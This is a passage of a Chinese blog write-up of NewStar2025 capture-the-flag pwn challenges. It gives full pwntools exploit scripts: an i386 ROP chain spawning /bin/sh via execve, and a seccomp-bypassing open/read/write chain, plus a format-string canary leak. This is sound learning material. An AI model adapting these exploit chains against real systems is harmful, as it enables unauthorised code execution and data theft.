ghsc@DESKTOP-JDO3EH1:~/NewStar2025/pwn$ ROPgadget --binary syscall  --only &#x27;pop|ret&#x27; | grep &#x27;edx&#x27;</span><br><span class="line">0x0804985c : pop edx ; ret</span><br></pre></td></tr></table></figure><p>0x080b438a : pop eax ; ret</p><p>0x08049022 : pop ebx ; ret</p><p>0x0804985a : pop ecx ; ret</p><p>0x0804985c : pop edx ; ret</p><p>payload 第一步要自先加上垃圾數據再加上read函數(0x3) </p><p>read(b , c , d):</p><p>ebx - 文件描述符 (fd)<br>ecx - 缓冲区地址 (buf)<br>edx - 读取字节数 (count)</p><p>int 0x80 后面最好跟着 ret，这是为了保持ROP链的连续性</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eax → pop ebx → pop ecx → pop edx → int 0x80 → ??? (控制流丢失)</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eax → pop ebx → pop ecx → pop edx → int 0x80 ; ret → 下一个gadget</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 查找 int 0x80 ; ret  gadget</span><br><span class="line">ROPgadget --binary syscall --only &#x27;int&#x27; | grep &#x27;ret&#x27;</span><br><span class="line">ROPgadget --binary syscall | grep &#x27;int 0x80&#x27; | grep &#x27;ret&#x27;</span><br></pre></td></tr></table></figure><p>這一題ROPgadget找不到((((((</p><p>在pwn 大佬的指導下在IDA找到了 , alt + b  查找 cd 80 (int 0x80)</p><p><img src="/16032a9cd3d793522eac631cff26843d.png" alt="screen-capture"></p><p>int 0x80 (0x08073A00)</p><p>因為有NX , 要棧對齊一下  , 加一個ret </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary syscall --only &quot;ret&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># nc 8.147.134.121 20502</span></span><br><span class="line">p=process(<span class="string">&quot;./syscall&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./syscall&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;8.147.134.121&#x27;,20502)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;pwn it guys!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss() + <span class="number">0x100</span>  <span class="comment"># 避免冲突</span></span><br><span class="line">read_addr = <span class="number">0x3</span></span><br><span class="line">execve = <span class="number">0xb</span> </span><br><span class="line">pop_eax = <span class="number">0x080b438a</span></span><br><span class="line">pop_ebx = <span class="number">0x08049022</span></span><br><span class="line">pop_ecx = <span class="number">0x0804985a</span></span><br><span class="line">pop_edx = <span class="number">0x0804985c</span></span><br><span class="line">int_0x80 = <span class="number">0x08073A00</span></span><br><span class="line">ret = <span class="number">0x0804900e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>)  <span class="comment">#_BYTE v1[14]; // [esp+6h] [ebp-12h] BYREF  0x12+4</span></span><br><span class="line">payload += p32(ret) </span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop_ebx)    <span class="comment"># read函数返回后的地址</span></span><br><span class="line">payload += p32(<span class="number">0</span>) </span><br><span class="line">payload += p32(pop_ecx)         <span class="comment"># fd = 0 (stdin)</span></span><br><span class="line">payload += p32(bss_addr)   <span class="comment"># buf地址</span></span><br><span class="line">payload += p32(pop_edx)</span><br><span class="line">payload += p32(<span class="number">8</span>)          <span class="comment"># 读取长度</span></span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二阶段：execve(&quot;/bin/sh&quot;, NULL, NULL)</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(execve) <span class="comment"># 系统调用号</span></span><br><span class="line">payload += p32(pop_ebx)</span><br><span class="line">payload += p32(bss_addr)   <span class="comment"># &quot;/bin/sh&quot;字符串地址</span></span><br><span class="line">payload += p32(pop_ecx)</span><br><span class="line">payload += p32(<span class="number">0</span>)          <span class="comment"># argv = NULL</span></span><br><span class="line">payload += p32(pop_edx)  </span><br><span class="line">payload += p32(<span class="number">0</span>)          <span class="comment"># envp = NULL</span></span><br><span class="line">payload += p32(int_0x80)   <span class="comment"># 触发系统调用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用IDA找的()gdb.attach(p) </p><p><img src="/9efeb14811e92550e1e3ffd36576ce4b.png" alt="screen-capture"></p><p>用ROPgadget找的(錯的死循环int)gdb.attach(p)</p><p><img src="/a92502d584b22948308a9e4d5d2d3e34.png" alt="screen-capture"></p><p>不管了 , 反正做出來了 !!(0v0)!!</p><h2 id="3-no-shell"><a href="#3-no-shell" class="headerlink" title="3.no shell"></a>3.no shell</h2><p>sandbox  這是一題沙盒題 , </p><p>hint：为什么假定要 rax 的值呢，或许可以在不知道具体值的情况下传递</p><p>看看checksec先</p><p><img src="/614104792a8abf8396f786753f5607a6.png" alt="screen-capture"></p><p>用一下沙盒 </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./noshell</span><br></pre></td></tr></table></figure><p><img src="/e54fd124f29b1e9523b08f59460e65a0.png" alt="screen-capture"></p><p>可以看見不可以用execve , ARCH_X86_64 , A!&#x3D;0xffffffff 了 return KILL </p><p>如果A&lt;0x40000000 就可以ALLOW </p><p>可以先看概論 :<br><a href="https://">https://www.bilibili.com/video/BV1Wi4y1A7Gr/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f</a></p><p>繞過:</p><p><a href="https://">https://www.bilibili.com/video/BV1Uv411j7fr?spm_id_from&#x3D;333.788.videopod.episodes&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f&amp;p&#x3D;16</a></p><p>沙箱!!! 省流:</p><h3 id="Secure-computing-mode"><a href="#Secure-computing-mode" class="headerlink" title="Secure computing mode"></a>Secure computing mode</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Seccomp restrict</span><br><span class="line">2.Seccomp filter</span><br><span class="line">3.使用prctl設置sandbox</span><br><span class="line">4.使用seccomp.h設置sandbox</span><br><span class="line">5.使用libseccomp設置sandbox</span><br></pre></td></tr></table></figure><h3 id="繞過思路"><a href="#繞過思路" class="headerlink" title="繞過思路"></a>繞過思路</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ORW</span><br><span class="line">  Open/openv</span><br><span class="line">  Read/readv</span><br><span class="line">  Write/writev</span><br></pre></td></tr></table></figure><p>i386與x86-64的調用號不同</p><p>可以利用retq指令修改cs寄存器</p><p>cs &#x3D;&#x3D; 0x23 代表32位模式 </p><p>cs &#x3D;&#x3D; 0x33 代表64位模式</p><p>可能是64轉成32位繞過</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 n2; // rax</span><br><span class="line">  __int64 n2_1; // [rsp+8h] [rbp-108h] BYREF</span><br><span class="line">  _BYTE buf[256]; // [rsp+10h] [rbp-100h] BYREF</span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  write(1, &quot;Your Power Has Been Restricted!\n&quot;, 0x20u);</span><br><span class="line">  write(1, &quot;But your mind is still free!\n&quot;, 0x1Du);</span><br><span class="line">  write(1, &quot;Do you want to say something?\n&quot;, 0x1Eu);</span><br><span class="line">  if ( getchar() == 121 || getchar() == 89 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, buf, 0xFFu);</span><br><span class="line">    buf[255] = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    write(1, &quot;You chose not to say anything.\n&quot;, 0x20u);</span><br><span class="line">  &#125;</span><br><span class="line">  write(1, &quot;leave or capture the flag?\n&quot;, 0x1Cu);</span><br><span class="line">  __isoc99_scanf(&quot;%lld&quot;, &amp;n2_1);</span><br><span class="line">  if ( n2_1 &lt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    n2 = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    n2 = n2_1;</span><br><span class="line">    if ( n2_1 &gt; 2 )</span><br><span class="line">      n2 = 2;</span><br><span class="line">  &#125;</span><br><span class="line">  n2_1 = n2;</span><br><span class="line">  if ( n2 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(1, &quot;You chose to leave.\n&quot;, 0x14u);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( n2_1 == 2 )</span><br><span class="line">    write(1, &quot;You chose to capture the flag!\n&quot;, 0x1Fu);</span><br><span class="line">  challenge();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">void __noreturn challenge()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // [rsp+Ch] [rbp-4h] BYREF</span><br><span class="line"></span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(1, &quot;Welcome to the challenge!\n&quot;, 0x1Au);</span><br><span class="line">    write(1, &quot;Please Make choice:\n&quot;, 0x14u);</span><br><span class="line">    write(1, &quot;1. Check your power\n&quot;, 0x14u);</span><br><span class="line">    write(1, &quot;2. Get the power of your cat\n&quot;, 0x18u);</span><br><span class="line">    write(1, &quot;3. Open the door\n&quot;, 0x11u);</span><br><span class="line">    write(1, &quot;4. Destroy this world\n&quot;, 0x16u);</span><br><span class="line">    write(1, &quot;5. leave this world\n&quot;, 0x14u);</span><br><span class="line">    write(1, &quot;your choice: &quot;, 0xDu);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v0);</span><br><span class="line">    switch ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        Check_your_power();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        Get_the_power_of_your_cat();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        open_the_door();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        destroy_this_world();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        write(1, &quot;Goodbye!\n&quot;, 9u);</span><br><span class="line">        exit(0);</span><br><span class="line">      default:</span><br><span class="line">        write(1, &quot;Invalid choice!\n&quot;, 0x10u);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点：main 中的 read(0, buf, 0xFFu) 和 Check_your_power() 中的 read(0, buf, off)</p><p><img src="/3f60105557699cd108270e6098530c9e.png" alt="cab6d0c5-9697-4bcf-8d1b-e9a9eab14100.png"></p><h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>參考文章:<br><a href="https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/">https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/</a></p><p>省流:</p><br/><ol><li>Open系統呼叫<br>系統呼叫號：2（在x86-64中，open的系統呼叫號是2）<br>參數：</li></ol><p>rdi: 檔案路徑的字串指標（例如：字串”flag”的地址）</p><p>rsi: 打開檔案的標誌（例如：O_RDONLY&#x3D;0）</p><p>rdx: 模式（通常在使用O_CREAT時需要，這裡可以設為0）</p><p>成功執行後，rax會返回檔案描述符（通常是一個非負整數，例如3）。</p><ol start="2"><li>Read系統呼叫<br>系統呼叫號：0<br>參數：</li></ol><p>rdi: 檔案描述符（從open返回的fd）</p><p>rsi: 讀取內容存放的緩衝區地址</p><p>rdx: 要讀取的位元組數</p><p>成功執行後，rax返回實際讀取的位元組數。</p><ol start="3"><li>Write系統呼叫<br>系統呼叫號：1<br>參數：</li></ol><p>rdi: 檔案描述符（這裡我們要輸出到標準輸出，所以是1）</p><p>rsi: 要寫入的資料的緩衝區地址（也就是read讀取到的緩衝區）</p><p>rdx: 要寫入的位元組數（通常使用read返回的位元組數，但我們也可以設定一個固定的值）</p><p>注意：在ORW中，我們通常將讀取的內容寫到標準輸出（fd&#x3D;1）以便看到檔案內容。</p><br/><p>先用ROPgadget找找寄存器:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary noshell  --only &#x27;pop|ret&#x27; | grep &#x27;rdi&#x27;</span><br><span class="line">ROPgadget --binary noshell  --only &#x27;pop|ret&#x27; | grep &#x27;rsi&#x27;</span><br><span class="line">ROPgadget --binary noshell  --only &#x27;pop|ret&#x27; | grep &#x27;rdx&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004013f3 : pop rdi ; ret</span><br><span class="line">0x00000000004013f5 : pop rsi ; ret</span><br><span class="line">0x00000000004013f7 : pop rdx ; ret</span><br></pre></td></tr></table></figure><p>payload &#x3D; b’a’ (0x20 + 8 )</p><p>payload +&#x3D; pop_rdi +  flag_addr</p><p>payload +&#x3D; rsi + p64(0)</p><p>payload +&#x3D; pop_rdx + p64(0) </p><p>payload  +&#x3D; open </p><p>這是一個open函數的動作 , 先找一找flag.txt </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary noshell --string &quot;./flag&quot;</span><br></pre></td></tr></table></figure><p><img src="/defe5f0b422abdd4d61adb4393cdf203.png" alt="screen-capture"></p><p>flag.txt &#x3D; 0x40206a</p><p>省流: 可以用p64(p.plt[‘open’]) , 不過可以自己找</p><p>在IDA找到了open_the_door 追蹤一下call open  </p><p><img src="/344110f1e821dc33778caecb38fb0c7f.png" alt="screen-capture"></p><p><img src="/cb8b8afe3c649b025f199ccbd857b3f9.png" alt="screen-capture"></p><p>open &#x3D; 0x4011E0</p><p>接下來是read </p><p>read( 3 , bss , 0x100) </p><p>payload &#x3D; p64(magic)</p><p>#payload +&#x3D; pop_rdi + p64(3)</p><p>payload +&#x3D; pop_rsi + p64(bss)</p><p>payload +&#x3D; pop_rdx +p64(0x100)</p><p>payload +&#x3D; read()</p><p>讀256個字節</p><p>magic 是什麼?</p><p>在IDA alt+b 查 48 89 C7 , 找到了一個有ret的</p><p><img src="/e39231ce6c528dad0c08a1adae63a8ed.png" alt="screen-capture"></p><p>magic &#x3D; 0x04013F9</p><p>接下來是write操作:<br>payload &#x3D; pop_rdi + p64(1) + p64(p.plt[‘write’])</p><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;8.147.132.32&#x27;</span>, <span class="number">18505</span>)</span><br><span class="line"><span class="comment">#nc 8.147.132.32 18505</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./noshell&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./noshell&#x27;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4013f3</span> </span><br><span class="line">pop_rsi = <span class="number">0x4013f5</span></span><br><span class="line">pop_rdx = <span class="number">0x4013f7</span></span><br><span class="line">flag = <span class="number">0x40206a</span></span><br><span class="line">magic = <span class="number">0x4013F9</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(pop_rdi) +p64(flag) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(e.plt[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p64(magic) + p64(pop_rsi) + p64(e.bss(<span class="number">0x400</span>)) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(e.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(e.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Do you want to say something?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;leave or capture the flag?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-input-small-function-味复刻"><a href="#4-input-small-function-味复刻" class="headerlink" title="4.input_small_function(味复刻)"></a>4.input_small_function(味复刻)</h2><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><p>fmt and canary</p><h3 id="Ubuntu-GLIBC-2-35-0ubuntu3-10"><a href="#Ubuntu-GLIBC-2-35-0ubuntu3-10" class="headerlink" title="Ubuntu GLIBC 2.35-0ubuntu3.10"></a>Ubuntu GLIBC 2.35-0ubuntu3.10</h3><p><a href="https://www.bilibili.com/video/BV11t4y1R7dV/?spm_id_from=333.337.search-card.all.click&vd_source=b128d59725d91ecef706ce0b01795a8f">https://www.bilibili.com/video/BV11t4y1R7dV/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f</a></p><p>打開IDA  alt+ t 搜 ubuntu </p><p><img src="/ae62107e978fff735b26809634275271.png" alt="screen-capture"></p><p>下載patchelf 和 glibc-all-in-one</p><p>patchelf安裝</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install patchelf</span><br></pre></td></tr></table></figure><p>glibc-all-in-one安裝</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitclone.com/github.com/matrix1001/glibc-all-in-one</span><br><span class="line"></span><br><span class="line">cd glibc-all-in-one</span><br><span class="line"></span><br><span class="line">sudo python3 update_list</span><br><span class="line"></span><br><span class="line">cat list</span><br><span class="line"></span><br><span class="line">#需要使用的Ubuntu </span><br><span class="line">sudo ./download x.xx-xubuntux_xxx</span><br><span class="line">#以我的題為例</span><br><span class="line">sudo ./download 2.35-0ubuntu3.11_amd64</span><br><span class="line">#list 有 list 和 old_list</span><br><span class="line">sudo ./download_old x.xx-xubuntux_xxx</span><br></pre></td></tr></table></figure><p>用patchelf更換 libc 和 ld 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#換ld文件</span><br><span class="line">patchelf --set-interpreter /??/??/??  程式</span><br><span class="line">#這一題</span><br><span class="line">patchelf --set-interpreter home/ghsc/glibc-all-in-one/libs/2.35-0ubuntu3.11_amd64/ld-linux-x86-64.so.2  fmt_canary</span><br><span class="line">#換libc文件</span><br><span class="line">patchelf --replace-needed libc.so.6 /??/??/?? 程式</span><br><span class="line">#這一題，先恢复原始状态（如果需要）</span><br><span class="line">patchelf --replace-needed home/ghsc/glibc-all-in-one/libs/2.35-0ubuntu3.11_amd64/libc.so.6 libc.so.6 fmt_canary</span><br><span class="line">patchelf --replace-needed libc.so.6 home/ghsc/glibc-all-in-one/libs/2.35-0ubuntu3.11_amd64/libc.so.6  fmt_canary</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/ea4b089eb27806b3cb21659062979649.png" alt="screen-capture"></p><p>開了NX , 動連 , 要用libc函數了 , RELRO: Partial RELRO , IDA一下 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[40]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  puts(&amp;::s);</span><br><span class="line">  puts(&amp;s_);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    memset(s, 0, sizeof(s));</span><br><span class="line">    puts(&amp;s__0);</span><br><span class="line">    read(0, s, 0x27u);</span><br><span class="line">    printf(s);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( strcmp(s, &quot;end\n&quot;) );</span><br><span class="line">  puts(&amp;s__1);</span><br><span class="line">  printf(&amp;format);</span><br><span class="line">  read(0, s, 0x100u);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先判斷攻擊點 , 大概是在打了end後 有一個read(0 , s ,0x100u)</p><hr><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>兩個read , 一個0x28字節 , 一個0x100字節 ,  先找到canary先</p><p>b *0x4012D4</p><p>cyclic一下 , stack 30 </p><p><img src="/38914278c811ac30f307420157097042.png" alt="screen-capture"></p><p>不難看出canary就在rbp-0x8 </p><p> 0x7fffffffd508 ◂— 0xad7425d44ff65a00</p><p><img src="/ace979370317ac6777209432f8a910c8.png" alt="screen-capture"></p><p>找對了 , 算一算偏移量 ,  (0x508 - 0x4e0)&#x2F;8 &#x3D; 5</p><p><img src="/b11ccd5cf72b0fda7b0b176e269d4aa4.png" alt="screen-capture"></p><p>字符串偏移量為6  , 6+5 &#x3D; 11</p><p>%11$p :<br><img src="/dd0a1909e4d111d5a162f737b16e6af8.png" alt="screen-capture"></p><p>成功找到 canary </p><hr><h3 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h3><p>libc的基礎:</p><p><a href="https://www.bilibili.com/video/BV1mr4y1Y7fW?spm_id_from=333.788.videopod.episodes&vd_source=b128d59725d91ecef706ce0b01795a8f&p=20">https://www.bilibili.com/video/BV1mr4y1Y7fW?spm_id_from&#x3D;333.788.videopod.episodes&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f&amp;p&#x3D;20</a></p><p>然後要寫一下 ret2libc  , 參考文章: </p><p><a href="https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/">https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/</a></p><p>用IDA開一下llibc.so.6</p><p>gdb vmmap 一下 :<br><img src="/8cec771cddee1684595214e44bc1f9bb.png" alt="screen-capture"></p><p> 0x7ffff7c00000 - 0x7ffff7e1c000  是libc 的區域  , 如果要調用的話要先算一算偏移量</p><p><img src="/97d10cc3ca79658e4a25b6b472f02ad6.png" alt="screen-capture"></p><p>找一下ROPgadget , <strong>pop_rdi &#x3D; 基址 + 